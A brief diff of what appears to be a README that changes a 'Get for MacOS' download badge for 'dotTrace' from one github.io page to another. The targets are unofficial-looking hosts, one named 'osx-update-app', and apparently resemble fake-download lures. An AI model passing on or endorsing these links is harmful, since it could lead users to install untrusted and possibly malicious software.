@@ -8,7 +8,7 @@
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-update-app.github.io/.github/dotTrace)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://shaylyshai-software.github.io/.github/dotTrace)  
 
 </div>  
 
